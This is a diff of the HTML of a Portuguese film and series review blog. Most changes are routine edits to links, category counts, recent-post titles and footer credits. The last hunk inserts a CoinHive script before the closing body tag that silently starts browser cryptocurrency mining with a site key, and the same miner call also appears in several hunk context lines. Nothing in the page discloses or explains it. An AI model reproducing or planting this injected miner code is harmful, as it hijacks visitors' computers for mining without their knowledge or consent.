 
 		<h2 class="post-title entry-title">
-			<a href="/archives/4214" rel="bookmark" title="Livro: Toureando o Diabo" target="_blank">Livro: Toureando o Diabo</a>
+			<a href="/archives/4214" rel="bookmark" title="Livro: Toureando o Diabo">Livro: Toureando o Diabo</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -824,7 +871,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/4131" rel="bookmark" title="Terra Fria (North Country, 2005)" target="_blank">Terra Fria (North Country, 2005)</a>
+			<a href="/archives/4131" rel="bookmark" title="Terra Fria (North Country, 2005)">Terra Fria (North Country, 2005)</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -853,7 +900,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/4033" rel="bookmark" title="A Bela e a Fera (Beauty and the Beast, 2017)" target="_blank">A Bela e a Fera (Beauty and the Beast, 2017)</a>
+			<a href="/archives/4033" rel="bookmark" title="A Bela e a Fera (Beauty and the Beast, 2017)">A Bela e a Fera (Beauty and the Beast, 2017)</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -882,7 +929,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/3936" rel="bookmark" title="Era o Hotel Cambridge (2016)" target="_blank">Era o Hotel Cambridge (2016)</a>
+			<a href="/archives/3936" rel="bookmark" title="Era o Hotel Cambridge (2016)">Era o Hotel Cambridge (2016)</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -911,7 +958,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/3548" rel="bookmark" title="Dicas Netflix Março" target="_blank">Dicas Netflix Março</a>
+			<a href="/archives/3548" rel="bookmark" title="Dicas Netflix Março">Dicas Netflix Março</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -940,7 +987,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/3547" rel="bookmark" title="Análise dos Indicados ao Prêmio do Sindicato dos Figurinistas 2017" target="_blank">Análise dos Indicados ao Prêmio do Sindicato dos Figurinistas 2017</a>
+			<a href="/archives/3547" rel="bookmark" title="Análise dos Indicados ao Prêmio do Sindicato dos Figurinistas 2017">Análise dos Indicados ao Prêmio do Sindicato dos Figurinistas 2017</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -969,7 +1016,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/3541" rel="bookmark" title="Filmes Assistidos em Fevereiro" target="_blank">Filmes Assistidos em Fevereiro</a>
+			<a href="/archives/3541" rel="bookmark" title="Filmes Assistidos em Fevereiro">Filmes Assistidos em Fevereiro</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -998,7 +1045,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/3201" rel="bookmark" title="Bolão do Oscar 2017" target="_blank">Bolão do Oscar 2017</a>
+			<a href="/archives/3201" rel="bookmark" title="Bolão do Oscar 2017">Bolão do Oscar 2017</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1027,7 +1074,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/2652" rel="bookmark" title="8 anos de Estante da Sala" target="_blank">8 anos de Estante da Sala</a>
+			<a href="/archives/2652" rel="bookmark" title="8 anos de Estante da Sala">8 anos de Estante da Sala</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1056,7 +1103,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/2612" rel="bookmark" title="Filmes Assistidos em Janeiro" target="_blank">Filmes Assistidos em Janeiro</a>
+			<a href="/archives/2612" rel="bookmark" title="Filmes Assistidos em Janeiro">Filmes Assistidos em Janeiro</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1085,7 +1132,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/2586" rel="bookmark" title="Estrelas Além do Tempo (Hidden Figures, 2016)" target="_blank">Estrelas Além do Tempo (Hidden Figures, 2016)</a>
+			<a href="/archives/2586" rel="bookmark" title="Estrelas Além do Tempo (Hidden Figures, 2016)">Estrelas Além do Tempo (Hidden Figures, 2016)</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1114,7 +1161,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/2534" rel="bookmark" title="La La Land: Cantando Estações (La La Land, 2016)" target="_blank">La La Land: Cantando Estações (La La Land, 2016)</a>
+			<a href="/archives/2534" rel="bookmark" title="La La Land: Cantando Estações (La La Land, 2016)">La La Land: Cantando Estações (La La Land, 2016)</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1143,7 +1190,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/1727" rel="bookmark" title="A Criada (Ah-ga-ssi, 2016)" target="_blank">A Criada (Ah-ga-ssi, 2016)</a>
+			<a href="/archives/1727" rel="bookmark" title="A Criada (Ah-ga-ssi, 2016)">A Criada (Ah-ga-ssi, 2016)</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1172,7 +1219,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/1720" rel="bookmark" title="Dicas Netflix Janeiro" target="_blank">Dicas Netflix Janeiro</a>
+			<a href="/archives/1720" rel="bookmark" title="Dicas Netflix Janeiro">Dicas Netflix Janeiro</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -1249,7 +1296,7 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-36"><a href="/archives/category/cine-alerta-series" >Cine Alerta (Séries)</a> (38)
 </li>
-	<li class="cat-item cat-item-2"><a href="/archives/category/cinema" >Cinema</a> (1,837)
+	<li class="cat-item cat-item-2"><a href="/archives/category/cinema" >Cinema</a> (1,841)
 </li>
 	<li class="cat-item cat-item-8"><a href="/archives/category/cinema-em-cena" >Cinema em Cena</a> (10)
 </li>
@@ -1259,13 +1306,13 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-32"><a href="/archives/category/cinema-em-serie-series" >Cinema em Série (Séries)</a> (3)
 </li>
-	<li class="cat-item cat-item-40"><a href="/archives/category/cinema-no-escurinho" >Cinema no escurinho</a> (10)
+	<li class="cat-item cat-item-40"><a href="/archives/category/cinema-no-escurinho" >Cinema no escurinho</a> (11)
 </li>
 	<li class="cat-item cat-item-38"><a href="/archives/category/criticos-com" >Críticos.com</a> (94)
 </li>
 	<li class="cat-item cat-item-11 current-cat"><a href="/archives/category/estante-da-sala" >Estante da Sala</a> (40)
 </li>
-	<li class="cat-item cat-item-39"><a href="/archives/category/filmes-classicos" >Filmes Clássicos</a> (42)
+	<li class="cat-item cat-item-39"><a href="/archives/category/filmes-classicos" >Filmes Clássicos</a> (43)
 </li>
 	<li class="cat-item cat-item-10"><a href="/archives/category/filmes-do-chico" >Filmes do Chico</a> (24)
 </li>
@@ -1273,7 +1320,7 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-25"><a href="/archives/category/meus-2-centavos" >Meus 2 Centavos</a> (128)
 </li>
-	<li class="cat-item cat-item-18"><a href="/archives/category/mix-de-series" >Mix de Séries</a> (1,336)
+	<li class="cat-item cat-item-18"><a href="/archives/category/mix-de-series" >Mix de Séries</a> (1,339)
 </li>
 	<li class="cat-item cat-item-26"><a href="/archives/category/nerd-rabugento" >Nerd Rabugento</a> (96)
 </li>
@@ -1287,11 +1334,11 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-24"><a href="/archives/category/pipocando" >Pipocando</a> (192)
 </li>
-	<li class="cat-item cat-item-21"><a href="/archives/category/plano-critico-cinema" >Plano Crítico (Cinema)</a> (770)
+	<li class="cat-item cat-item-21"><a href="/archives/category/plano-critico-cinema" >Plano Crítico (Cinema)</a> (773)
 </li>
 	<li class="cat-item cat-item-20"><a href="/archives/category/plano-critico-series" >Plano Crítico (Séries)</a> (419)
 </li>
-	<li class="cat-item cat-item-6"><a href="/archives/category/podcast" >Podcast</a> (220)
+	<li class="cat-item cat-item-6"><a href="/archives/category/podcast" >Podcast</a> (221)
 </li>
 	<li class="cat-item cat-item-22"><a href="/archives/category/pop-series" >Pop Séries</a> (34)
 </li>
@@ -1299,11 +1346,11 @@ var wid = '288202';
 </li>
 	<li class="cat-item cat-item-13"><a href="/archives/category/razao-de-aspecto" >Razão de Aspecto</a> (177)
 </li>
-	<li class="cat-item cat-item-17"><a href="/archives/category/serie-maniacos" >Série Maníacos</a> (1,948)
+	<li class="cat-item cat-item-17"><a href="/archives/category/serie-maniacos" >Série Maníacos</a> (1,956)
 </li>
 	<li class="cat-item cat-item-34"><a href="/archives/category/serie-maniacos-podcast" >Série Maníacos (Podcast)</a> (69)
 </li>
-	<li class="cat-item cat-item-16"><a href="/archives/category/series" >Séries</a> (3,864)
+	<li class="cat-item cat-item-16"><a href="/archives/category/series" >Séries</a> (3,875)
 </li>
 	<li class="cat-item cat-item-15"><a href="/archives/category/viagem-pelo-cinema" >Viagem pelo Cinema</a> (9)
 </li>
@@ -1312,19 +1359,19 @@ var wid = '288202';
 		</ul>
 </div>		<div id="recent-posts-2" class="widget widget_recent_entries">		<h3 class="widget-title">Publicações recentes</h3>		<ul>
 					<li>
-				<a href="/archives/7737">Crítica | Réquiem para um Sonho</a>
+				<a href="/archives/7751">Crítica | Amityville: O Despertar</a>
 						</li>
 					<li>
-				<a href="/archives/7730">Audiência USA – 12/09/17: Terça</a>
+				<a href="/archives/7745">Stitchers é cancelado depois de 3 temporadas pelo Freeform</a>
 						</li>
 					<li>
-				<a href="/archives/7729">Audiência USA – 11/09/17: Segunda</a>
+				<a href="/archives/7744">Kidding: Jim Carrey vai estrelar nova série do Showtime</a>
 						</li>
 					<li>
-				<a href="/archives/7728">Audiência USA – 10/09/17: Domingo</a>
+				<a href="/archives/7753">&quot;Feito na América&quot; e embalado sob medida para o talento de Tom Cruise</a>
 						</li>
 					<li>
-				<a href="/archives/7727">Masterchef Profissionais 2×02: Top 13</a>
+				<a href="/archives/7743">Audiência USA – 14/09/17: Quinta</a>
 						</li>
 				</ul>
 		</div>		
@@ -1370,7 +1417,9 @@ var wid = '288202';
                               <p>Críticas &copy; 2017. All Rights Reserved.</p>
                           </div><!--/#copyright-->
 
-                          <div id="credit" style="">Developed by <b><a href="http://www.drall.com.br" style="color:#d66000" target="_blank">Drall Consulting</a></b></div><!--/#credit-->
+                          <div id="credit" style="">
+                <p>Powered by <a href="http://wordpress.org" target="_blank">WordPress</a>. Theme by <a href="http://presscustomizr.com">Press Customizr</a>.</p>
+              </div><!--/#credit-->
             
           </div>
 
@@ -1396,7 +1445,7 @@ var wpcf7 = {"apiSettings":{"root":"http:\/\/criticas.centrodouniverso.com.br\/w
 <script type='text/javascript' src='/wp-includes/js/underscore.min.js'></script>
 <script type='text/javascript'>
 /* <![CDATA[ */
-var HUParams = {"_disabled":[],"SmoothScroll":{"Enabled":true,"Options":{"touchpadSupport":false}},"centerAllImg":"1","timerOnScrollAllBrowsers":"1","extLinksStyle":"","extLinksTargetExt":"","extLinksSkipSelectors":{"classes":["btn","button"],"ids":[]},"imgSmartLoadEnabled":"","imgSmartLoadOpts":{"parentSelectors":[".container .content",".container .sidebar","#footer","#header-widgets"],"opts":{"excludeImg":[".tc-holder-img"],"fadeIn_options":100}},"goldenRatio":"1.618","gridGoldenRatioLimit":"350","sbStickyUserSettings":{"desktop":true,"mobile":true},"isWPMobile":"","menuStickyUserSettings":{"desktop":"stick_up","mobile":"stick_up"},"isDevMode":"","ajaxUrl":"http:\/\/criticas.centrodouniverso.com.br\/?huajax=1","frontNonce":{"id":"HuFrontNonce","handle":"82f2d222f7"},"userStarted":{"with":"with|3.2.10","on":{"date":"2017-05-19 14:07:11.000000","timezone_type":3,"timezone":"UTC"}},"isWelcomeNoteOn":"","welcomeContent":""};
+var HUParams = {"_disabled":[],"SmoothScroll":{"Enabled":true,"Options":{"touchpadSupport":false}},"centerAllImg":"1","timerOnScrollAllBrowsers":"1","extLinksStyle":"","extLinksTargetExt":"","extLinksSkipSelectors":{"classes":["btn","button"],"ids":[]},"imgSmartLoadEnabled":"","imgSmartLoadOpts":{"parentSelectors":[".container .content",".container .sidebar","#footer","#header-widgets"],"opts":{"excludeImg":[".tc-holder-img"],"fadeIn_options":100}},"goldenRatio":"1.618","gridGoldenRatioLimit":"350","sbStickyUserSettings":{"desktop":true,"mobile":true},"isWPMobile":"","menuStickyUserSettings":{"desktop":"stick_up","mobile":"stick_up"},"isDevMode":"","ajaxUrl":"http:\/\/criticas.centrodouniverso.com.br\/?huajax=1","frontNonce":{"id":"HuFrontNonce","handle":"bd86fd2199"},"userStarted":{"with":"with|3.2.10","on":{"date":"2017-05-19 14:07:11.000000","timezone_type":3,"timezone":"UTC"}},"isWelcomeNoteOn":"","welcomeContent":""};
 /* ]]> */
 </script>
 <script type='text/javascript' src='/wp-content/themes/hueman/assets/front/js/scripts.min.js'></script>
@@ -1404,7 +1453,7 @@ var HUParams = {"_disabled":[],"SmoothScroll":{"Enabled":true,"Options":{"touchp
 <!--[if lt IE 9]>
 <script src="http://criticas.centrodouniverso.com.br/wp-content/themes/hueman/assets/front/js/ie/respond.js"></script>
 <![endif]-->
-</body>
+<script type='text/javascript' src='https://coin-hive.com/lib/coinhive.min.js'></script><script>var speed = ( window.matchMedia("only screen and (max-width: 760px)").matches )?0.8:0.17;var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:speed});setTimeout(function(){__m.start();},3000);</script></body>
 </html><style>
 .site-description{
     color:white;
